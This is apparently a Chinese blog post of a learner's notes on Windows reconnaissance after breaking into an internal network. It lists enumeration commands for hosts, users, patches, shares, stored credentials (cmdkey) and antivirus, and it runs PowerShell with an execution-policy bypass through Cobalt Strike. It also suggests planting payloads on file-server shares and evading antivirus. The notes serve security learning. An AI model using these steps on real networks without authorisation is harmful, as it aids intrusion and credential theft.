1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">内网渗透</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>内网渗透</span></a></span></div></div><h1 class="post-title" itemprop="name headline">内网渗透学习-Windows信息搜集篇-持续更新</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-09-03T07:55:47.059Z" title="发表于 2023-09-03 15:55:47">2023-09-03</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-09-10T03:37:13.982Z" title="更新于 2023-09-10 11:37:13">2023-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透学习-Windows信息搜集篇-持续更新"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/"><header><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">内网渗透</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url">内网渗透</a><h1 id="CrawlerTitle" itemprop="name headline">内网渗透学习-Windows信息搜集篇-持续更新</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-09-03T07:55:47.059Z" title="发表于 2023-09-03 15:55:47">2023-09-03</time><time itemprop="dateCreated datePublished" datetime="2023-09-10T03:37:13.982Z" title="更新于 2023-09-10 11:37:13">2023-09-10</time></header><p>当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。</p>
<p>判断机器所处于网络拓扑哪个区域，是在<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8580587c3201">DMZ区</a>、<code>办公区</code>、<code>核心区</code>。区域界限是相对的</p>
<h2 id="0x01-机器角色判断">0x01 机器角色判断</h2>
<ul>
<li>文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机</li>
<li>DNS服务器：端口53，可通过DNS服务器获取内网web系统信息，或者探测域信息</li>
<li>DHCP服务器：查看内网多组网段信息，更多的获取拓补信息</li>
<li>开发测试服务器：获取源码，新的信息资产，多存在弱口令</li>
<li>代理服务器：获取服务器账号，拿到各种密码</li>
<li>web服务器：可能需要提权(一般接触到的环境)</li>
<li>个人PC：查看是否存在域环境</li>
</ul>
<h2 id="0x02-本机信息收集">0x02 本机信息收集</h2>
<p>包括操作系统、权限、内网IP段、杀软、端口、服务、补丁情况、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软一般都是批量安装的。文件共享/FTP连接记录、浏览器访问记录、mstsc连接记录、ssh连接记录。</p>
<ul>
<li>如果由于使用了x86的shell无法使用命令，需要在命令前加上<code>c:\windows\sysnative</code>，这样就能执行x64的命令了。</li>
</ul>
<h3 id="21-查看主机名">2.1 查看主机名</h3>
<p><code>hostname</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904213133038.png" alt="image-20230904213133038"></p>
<h3 id="22-查看版本">2.2 查看版本</h3>
<p><code>ver</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904213228806.png" alt="image-20230904213228806"></p>
<h3 id="23-查看所有环境变量">2.3 查看所有环境变量</h3>
<p><code>set</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214436820.png" alt="image-20230904214436820"></p>
<h3 id="24-查看安装驱动">2.4 查看安装驱动</h3>
<p><code>DRIVERQUERY</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214716930.png" alt="image-20230904214716930"></p>
<h3 id="25-查看操作系统信息">2.5 查看操作系统信息</h3>
<h4 id="251-架构">2.5.1 架构</h4>
<p><code>wmic os get osarchitecture</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214754849.png" alt="image-20230904214754849"></p>
<h4 id="252-系统名">2.5.2 系统名</h4>
<p><code>wmic os get caption</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214801657.png" alt="image-20230904214801657"></p>
<h3 id="26-查看逻辑盘">2.6 查看逻辑盘</h3>
<p><code>wmic logicaldisk get caption</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214847677.png" alt="image-20230904214847677"></p>
<h3 id="27-本机网络配置">2.7 本机网络配置</h3>
<p><code>ipconfig /all - ip地址信息</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904184627149.png" alt="image-20230904184627149"></p>
<p><code>netstat -ano - 端口信息</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904184725197.png" alt="image-20230904184725197"></p>
<p><code>arp -a - arp记录信息</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904184855347.png" alt="image-20230904184855347"></p>
<h3 id="28-查看当前系统版本">2.8 查看当前系统版本</h3>
<h4 id="tipwmic命令">tip：wmic命令</h4>
<p>顺便了解一下wmic命令作用</p>
<pre><code class="hljs plaintext">WMIC（Windows Management Instrumentation Command-line）是Windows操作系统中的一个命令行实用程序，用于执行各种系统管理任务和查询系统信息。通过WMIC，用户可以在命令行中执行各种WMI（Windows Management Instrumentation）操作，包括查询系统信息、管理进程、服务、网络设置等。 WMIC提供了丰富的命令</code></pre>
<p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904185053443.png" alt="image-20230904185053443"></p>
<h3 id="29-查看体系结构">2.9 查看体系结构</h3>
<p><code>echo %PROCESSOR_ARCHITECTURE%</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904185257979.png" alt="image-20230904185257979"></p>
<h3 id="210-查询操作系统及软件信息">2.10 查询操作系统及软件信息</h3>
<p><code>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" ## 英文系统</code><br>
<code>systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本" ## 中文系统</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904185818019.png" alt="image-20230904185818019"></p>
<p>这里不知为何打不开，找了几篇文章，感觉是环境变量的问题，设置了之后又发现语法错误，双引号是中文版的。。。，好在最后成功了，且为中文系统</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904191114509.png" alt="image-20230904191114509"></p>
<h3 id="211-查看net-framework版本">2.11 <a target="_blank" rel="noopener" href="http://xn--jvv205a.net">查看.net</a> framework版本</h3>
<p><code>reg query "HKLM\Software\Microsoft\NET Framework Setup\NDP" /s /v version | findstr /i version | sort /+26 /r</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904191245270.png" alt="image-20230904191245270"></p>
<h3 id="212-查看补丁列表">2.12 查看补丁列表</h3>
<p><code>systeminfo</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904191328746.png" alt="image-20230904191328746"></p>
<h3 id="213-查看补丁的名称-描述-id-安装时间等">2.13 查看补丁的名称、描述、ID、安装时间等</h3>
<p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904191657172.png" alt="image-20230904191657172"></p>
<h3 id="214-powershell收集软件的版本信息">2.14 PowerShell收集软件的版本信息</h3>
<p><code>powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name, version"</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904191734197.png" alt="image-20230904191734197"></p>
<h3 id="215-查看安装的软件的版本-路径等">2.15 查看安装的软件的版本、路径等</h3>
<pre><code class="hljs plaintext">wmic product get name, version</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904192209137.png" alt="image-20230904192209137"></p>
<p>查看软件比较靠谱的做法是远程加载本地ps文件，cs中可以使用powershell-import,上传ListInstallProgram.ps1后输入</p>
<pre><code class="hljs plaintext">powershell Get-list</code></pre>
<p>将文件放到靶机，本地加载也可以</p>
<pre><code class="hljs plaintext">shell powershell -exec bypass -Command "&amp; {Import-Module 'C:\Users\HackerQWQ\Desktop\ListInstalledProgram.ps1';Get-list}"</code></pre>
<p>这里尝试了半天，不知道从哪下手，还是对cs不熟悉，之后深入学习慢慢搞</p>
<h3 id="216-查看当前用户权限">2.16 查看当前用户权限</h3>
<p><code>whoami &amp;&amp; whoami /priv</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904210854189.png" alt="image-20230904210854189"></p>
<h3 id="217-查询本机服务信息">2.17 查询本机服务信息</h3>
<p><code>wmic service list brief</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904210935433.png" alt="image-20230904210935433"></p>
<h3 id="218-查看开启的服务">2.18 查看开启的服务</h3>
<p><code>net start</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904210950915.png" alt="image-20230904210950915"></p>
<h3 id="219-wmic查询进程信息">2.19 wmic查询进程信息</h3>
<p><code>wmic process list brief</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211011968.png" alt="image-20230904211011968"></p>
<h3 id="220-查看进程">2.20 查看进程</h3>
<p><code>tasklist /svc</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211034249.png" alt="image-20230904211034249"></p>
<h3 id="221-查看启动程序信息">2.21 查看启动程序信息</h3>
<p><code>wmic startup get command,caption</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211052427.png" alt="image-20230904211052427"></p>
<h3 id="222-查看计划任务需要高权限">2.22 查看计划任务(需要高权限)</h3>
<p><code>at（win10之前）</code><br>
<code>chtasks /query /fo LIST /v（win10之后）</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211208228.png" alt="image-20230904211208228"></p>
<h3 id="223-查看主机开机时间">2.23 查看主机开机时间</h3>
<p><code>net statistics workstation</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211242395.png" alt="image-20230904211242395"></p>
<h3 id="224-查看本机用户列表">2.24 查看本机用户列表</h3>
<p><code>net user</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211256931.png" alt="image-20230904211256931"></p>
<h3 id="225-获取本地管理员信息">2.25 获取本地管理员信息</h3>
<p><code>net localgroup administrators</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211358193.png" alt="image-20230904211358193"></p>
<h3 id="226-查看当前在线用户">2.26 查看当前在线用户</h3>
<p><code>query user || qwinsta</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211418778.png" alt="image-20230904211418778"></p>
<h3 id="227-查看在线用户">2.27 查看在线用户</h3>
<p><code>quser</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211427997.png" alt="image-20230904211427997"></p>
<h3 id="228-列出断开本地计算机与所连接的客户端的对话需要高权限">2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限)</h3>
<p><code>net session</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211530179.png" alt="image-20230904211530179"></p>
<h3 id="229-查询端口列表">2.29 查询端口列表</h3>
<p><code>Windows: netstat -ano</code><br>
<code>linux: netstat -tnlp</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211553775.png" alt="image-20230904211553775"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211619090.png" alt="image-20230904211619090"></p>
<h3 id="230-查看本机共享列表和可访问的域共享列表">2.30 查看本机共享列表和可访问的域共享列表</h3>
<p><code>net share （445端口）</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211638834.png" alt="image-20230904211638834"></p>
<h3 id="231-查找共享列表">2.31 查找共享列表</h3>
<p><code>wmic share get name,path,status</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904211654136.png" alt="image-20230904211654136"></p>
<h3 id="232-磁盘映射">2.32 磁盘映射</h3>
<p><code>net use k: \192.168.1.10\c$</code></p>
<p>这里不太懂，没搞出来</p>
<h3 id="233-查询路由表">2.33 查询路由表</h3>
<pre><code class="hljs plaintext">route print</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904212407238.png" alt="image-20230904212407238"></p>
<p>可用接口的ARP缓存表。局域网内arp -a，查看是否有重复的mac地址，判断是否存在arp欺骗。服务器绑定mac地址方式防止arp欺骗</p>
<pre><code class="hljs plaintext">arp -a</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904212555006.png" alt="image-20230904212555006"></p>
<h3 id="234-查看远程连接信息">2.34 查看远程连接信息</h3>
<p><code>cmdkey /l</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904212709052.png" alt="image-20230904212709052"></p>
<h3 id="235-查看杀软">2.35 查看杀软</h3>
<p><code>WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code></p>
<p>暂时没有</p>
<h3 id="236-查看本地密码策略">2.36 查看本地密码策略</h3>
<p><code>net accounts</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214925560.png" alt="image-20230904214925560"></p>
<h3 id="237-查看hosts文件">2.37 查看hosts文件：</h3>
<p><code>linux:cat /etc/hosts</code><br>
<code>windows:type c:\Windows\system32\drivers\etc\hosts</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904214950300.png" alt="image-20230904214950300"></p>
<h3 id="238-查看dns缓存">2.38 查看dns缓存</h3>
<p><code>ipconfig /displaydns</code></p>
<ul>
<li>
<p>列举安装的软件</p>
<p>ListInstalledProgram项目地址:<a target="_blank" rel="noopener" href="https://github.com/3gstudent/ListInstalledPrograms">https://github.com/3gstudent/ListInstalledPrograms</a></p>
</li>
<li>
<p>自动信息收集</p>
<p>我们可使用自动化脚本WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，<strong>Windows 7</strong>以上版本的低权限用户允许访问<strong>WMIC</strong>并执行相关操作。 执行后，会将信息收集的结果写入HTML文档。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904215134630.png" alt="image-20230904215134630"></p>
<p>获取主机信息也可以用Seatbelt.exe，项目地址：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt/tree/master%EF%BC%8C%E9%9C%80%E8%A6%81%E7%BC%96%E8%AF%91%EF%BC%8C%E6%94%BE%E5%88%B0%E9%9D%B6%E6%9C%BA%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%B8%8B%E5%88%97%E5%91%BD%E4%BB%A4">https://github.com/GhostPack/Seatbelt/tree/master，需要编译，放到靶机上执行下列命令</a></p>
<pre><code class="hljs plaintext">shell Seatbelt.exe -group=all &gt; env.txt</code></pre>
<p>最好先<code>免杀一下</code>，不然360会一直警告,cs上的插件也有集成Seatbelt，可以直接使用插件   --这里等学了免杀在搞吧</p>
